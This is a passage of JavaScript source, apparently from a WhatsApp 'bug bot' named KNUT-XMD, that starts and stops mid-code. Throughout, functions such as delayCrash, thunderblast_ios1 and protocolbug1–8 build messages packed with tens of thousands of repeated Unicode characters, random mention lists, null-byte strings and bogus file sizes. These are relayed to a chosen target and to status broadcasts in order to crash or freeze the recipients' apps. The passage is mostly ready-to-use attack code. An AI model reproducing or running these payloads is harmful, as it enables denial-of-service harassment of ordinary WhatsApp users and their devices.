            accessibilityText: "ꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽ"
          }
        }
      ]
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}






async function test(message, sock) {
  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
      image: { url: "https://files.catbox.moe/kyaw5k.jpg" }, // Replace with local or hosted image
      caption: "wrong",
      footer: "KNUT-XMD",
      media: true,
      interactiveButtons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `KNUT ${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `knut ${"ꦾ".repeat(10000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `knut 2${"ꦾ".repeat(10000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `knut ${"ꦾ".repeat(10000)}\n\n`,
            url: "https://example.com"
          })
        }

      ]
    },
    {
      quoted: message
    }
  );
}


async function bug2(message, client, target) {

  const remoteJid = target;

  const groupMetadata= await client.groupMetadata(target);

  const participants = groupMetadata.participants.map(user => user.id);

  await client.sendMessage(

    remoteJid,
    {
      image: { url: "https://files.catbox.moe/kyaw5k.jpg" }, // Replace with local or hosted image

      caption: "KNUT XMD",

      footer: "🖤",

      media: true,

      interactiveButtons: [

        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `🖤 ${"ꦾ".repeat(29000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Te amo ${"ꦾ".repeat(29000)}\n\n`,
            url: "https://example.com"
          })
        },

      ]
    },
    {
      quoted: message,
       mentions: participants
    },

    

  );
}


async function bug3(message, client, target) {

  const remoteJid = target;

  const virus = "ꦾ".repeat(2000);

  const lastBug = await client.sendMessage(

    remoteJid,

    {
        text: "DEVIL-KNUT",

        footer: "🔞",

        cards: [

           {
              image: { url: '4.png' }, // or buffer,

              title: 'KNUT',

              caption: 'Devil-Knut',

              footer: "🖤",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: 'https://files.catbox.moe/kyaw5k.jpg' }, // or buffer,

              title: 'KNUT XMD',

              caption: 'vawulence',

              footer: "🔞",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: 'https://files.catbox.moe/kyaw5k.jpg' }, // or buffer,

              title: 'woooo',

              caption: 'woooo',

              footer: "🖤",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           }

        ]
    },

    { quoted : message }
)   

  return lastBug;


}

async function xUi(sock, target) {
const Interactive = {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
remoteJid: "X",
stanzaId: "123",
participant: target,
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 1900 }, () =>
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
),
],
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000,
},
forwardedAiBotMessageInfo: {
botName: "META AI",
botJid:
Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
creatorName: "Bot",
},
},
},
body: {
text:
" #4izxvelzExerct1st. " +
"ꦽ".repeat(50000) +
"ꦾ".repeat(50000),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "REVIEW",
flow_cta: "\0",
flow_message_version: "3",
}),
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"𑲭𑲭".repeat(10000)}`,
url: "https://Wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://Wa.me/stickerpack/4izxvelzexect",
}),
},
{
name: "cta_app_link",
buttonParamsJson: JSON.stringify({
display_text: `4izxvelzExerc1st. ${"ꦽ".repeat(10000)}`,
android_app_metadata: {
url: "https://Wa.me/stickerpack/4izxvelzexect",
consented_users_url: "https://t.me/rizxvelzexct",
},
}),
},
{
name: "galaxy_message",
buttonParamsJson:
"{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\"🩸ꢵ 𝐓‌‌𝐝‌𝐗‌ ꢵ 🩸\",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
},
],
messageParamsJson: "{}",
},
},
},
},
};

await sock.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
});
}
// === DelayInvisNew ===
async function DelayInvisNew(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "\u2060",
      matchedText: "\u2060",
      canonicalUrl: "https://t.me/DevRaizel",
      title: "𝐊𝐍𝐔𝐓",
      description: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇͞⃟🖤✦",
      jpegThumbnail: "https://files.catbox.moe/aanan8.jpg",
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 1,
          previewType: "DOCUMENT",
          title: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇͞⃟🖤✦",
          thumbnailUrl: "https://files.catbox.moe/aanan8.jpg",
          sourceUrl: "https://t.me/DevKnut"
        }
      }
    }
  };

  // On génère un vrai message WhatsApp
  const msg = generateWAMessageFromContent(target, { extendedTextMessage: payload.extendedTextMessage }, {});

  // Puis on l’envoie
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// === SuperDelayInvid corrigé ===
async function superdelayinvid(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇͞⃟🖤✦",
      contextInfo: {
        participant: "13135550002@s.whatsapp.net",
        quotedMessage: {
          extendedTextMessage: {
            text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇͞⃟🖤✦",
          },
        },
        remoteJid: "status@broadcast"
      }
    }
  };

  // Génération du message complet
  const msg = generateWAMessageFromContent(
    target,
    { extendedTextMessage: payload.extendedTextMessage },
    {}
  );

  // Envoi au contact ciblé
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}
// === DelayCrash corrigé ===
async function delayCrash(sock, target, mention = false, delayMs = 500) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mimetype: "image/jpeg",
          caption: "💥 KNUT-CRASH",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  // Générer le vrai message
  const msg = generateWAMessageFromContent(target, generateMessage, {});

  // Envoi direct sur la cible
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

  // Si mention activée
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }
    );
  }

  // Délai entre les envois
  await new Promise(res => setTimeout(res, delayMs));
}

async function Loc(sock, target, amount = 500, jids = false) {
  try {
    // Création du message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "🌍 KNUT LOC",
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "KNUT Location",
                },
                hasMediaAttachment: true,
              },
              body: {
                text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍͞⃟⏤͟͟͞͞͠🖤✦",
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 10 }, (_, i) => ({
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "⚡ " + "⩺".repeat(amount),
                    sections: [
                      {
                        title: `Section ${i + 1}`,
                        rows: [{ title: "Click", id: "row_" + i }],
                      },
                    ],
                  }),
                })),
              },
              carouselMessage: {
                cards: [],
              },
            },
          },
        },
      },
      {}
    );

    // Envoi du message
    await sock.relayMessage(
      target,
      msg.message,
      jids ? { participant: { jid: target }, messageId: msg.key.id } : { messageId: msg.key.id }
    );

    console.log("✅ Loc envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans Loc:", err);
  }
}

// === thunderblast_ios1 (Crash iOS) ==
async function thunderblast_ios1(sock, target) {
  const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);

  // Générateur
  const genMsg = (fileName, bodyText) =>
    generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc",
                  mimetype: "application/json",
                  fileName,
                  fileLength: "999999999999",
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileEncSha256:
                    "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                },
                hasMediaAttachment: true,
              },
              body: { text: bodyText },
              nativeFlowMessage: {
                messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_cta":"🚀","flow_id":"UNDEFINEDONTOP"}`,
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "UNDEFINEDONTOP" },
                ],
              },
            },
          },
        },
      }),
      {}
    );

  // Premier message
  const msg1 = genMsg(`${TravaIphone}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
  await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

  // Deuxième message
  const msg2 = genMsg(
    "UNDEFINEDONTOP",
    "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000)
  );
  await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

  // Location message
  const locMsg = generateWAMessageFromContent(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: TravaIphone,
        url: "https://youtube.com/@ShinZ.00",
      },
    },
    {}
  );
  await sock.relayMessage(target, locMsg.message, { messageId: locMsg.key.id });

  // ExtendedText message
  const extMsg = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: TravaIphone,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "UNDEFINEDONTOP↕️" + "ꦾ".repeat(50000),
          },
        },
      },
    },
    {}
  );
  await sock.relayMessage(target, extMsg.message, { messageId: extMsg.key.id });
}

// === callHome ===
async function callHome(sock, target, ptcp = true) {
  try {
    const conf = ptcp ? { participant: { jid: target } } : {};

    // Génération correcte du message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { hasMediaAttachment: false },
              body: {
                text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐋𝐋͞⃟⏤͟͟͞͞͠🩸✦",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({ status: "📞" }),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "",
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    // Envoi avec clé
    await sock.relayMessage(target, msg.message, {
      ...conf,
      messageId: msg.key.id,
    });

    console.log("✅ callHome envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur callHome:", err);
  }
}

// === Protocol Bug 1 ===
async function protocolbug1(sock, target, mention = false) {
  try {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
      title: "⩀".repeat(9741),
      rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "🌈 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝐁𝐮𝐠",
            listType: 2,
            buttonText: null,
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🌐" },
            contextInfo: {
              mentionedJid: Array.from({ length: 9741 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target, // ✅ ici on envoie bien sur la cible
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "9741@newsletter",
                serverMessageId: 1,
                newsletterName: "x!s - rizxvelz",
              },
            },
            description: "( # )",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    // ✅ envoyer au target (pas juste status@broadcast)
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // ✅ tu peux garder l'envoi vers status@broadcast en plus si tu veux que ça touche aussi les status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Envoi d'un "mention protocol" si activé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "🌐 Protocol Mention Flood" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug1 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug1:", err);
  }
}
// === Protocol Bug 2 (Image Flood) ===
async function protocolbug2(sock, target, mention = false) {
  try {
    const generateMessage = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: "⚡ ProtocolBug2 ⚡",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            contextInfo: {
              mentionedJid: Array.from({ length: 30000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
              participant: target,
              remoteJid: target, // ✅ correction : envoi direct au target
              forwardingScore: 9741,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) aussi sur status@broadcast si tu veux l'effet status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug2 Mention ⚡" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug2:", err);
  }
}

// === Protocol Bug 8 (Video + Embedded Music) ===
async function protocolbug8(sock, target, mention = false) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: ".Rizxvelz Official" + "⚡".repeat(5000),
      title: "Zoro",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
      artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
      isExplicit: true
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "⚡ ProtocolBug8 ⚡",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      contextInfo: { 
        mentionedJid: mentionedList,
        remoteJid: target  // ✅ Correction : cible réelle
      },
      annotations: [{ embeddedContent: { embeddedMusic } }]
    };

    // Génération du message
    const msg = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { videoMessage } } },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) flood aussi via broadcast
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Mentions spéciales si activé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
        },
        {
          additionalNodes: [
            { tag: "meta", attrs: { is_status_mention: "⚡ ProtocolBug8 Mention ⚡" }, content: undefined }
          ]
        }
      );
    }

    console.log("✅ ProtocolBug8 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug8:", err);
  }
}
// === Protocol Bug 6 (Interactive Flood) ===
async function protocolbug6(sock, target, mention = false) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "⚡ ProtocolBug6 ⚡", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "flex_agency",
                paramsJson: "\u0000".repeat(500000), // ⚡ flood massif
                version: 3,
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "x!s - rizxvelz",
                  newsletterJid: "120363319314627296@newsletter",
                  serverMessageId: 1,
                },
              },
            },
          },
        },
      },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // (Optionnel) Envoi en broadcast pour effet status
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Mentions si demandé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug6 Mention ⚡" },
              content: undefined,
            },
          ],
        }
      );
    }

    console.log("✅ ProtocolBug6 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug6:", err);
  }
}
// === Protocol Bug 7 (Audio Flood) ===
async function protocolbug7(sock, target, mention = false) {
  try {
    const mentionedJids = Array.from({ length: 40000 }, () =>
      `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    );

    const audioMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      mimetype: "audio/mpeg",
      fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
      fileLength: 9999999999,
      seconds: 999999,
      ptt: true,
      mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
      fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      contextInfo: {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "⚡ Rizxvelz Flood ⚡"
        }
      }
    };

    const msg = generateWAMessageFromContent(
      target,
      { ephemeralMessage: { message: { audioMessage } } },
      {}
    );

    // ✅ Envoi direct à la cible
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    // ✅ Envoi broadcast (pour status flood en parallèle)
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });

    // ✅ Mention si demandé
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "⚡ ProtocolBug7 Mention ⚡" },
              content: undefined
            }
          ]
        }
      );
    }

    console.log("✅ ProtocolBug7 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur ProtocolBug7:", err);
  }
}
// === Carousels2 ===
async function carousels2(sock, target, fJids = false) {
  try {
    // ✅ Image à utiliser
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/c11niu.jpeg" } }, // ton image ici
      { upload: sock.waUploadToServer }
    );

    const header = proto.Message.InteractiveMessage.Header.fromObject({
      imageMessage: media.imageMessage,
      title: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🖤✦",
      gifPlayback: false,
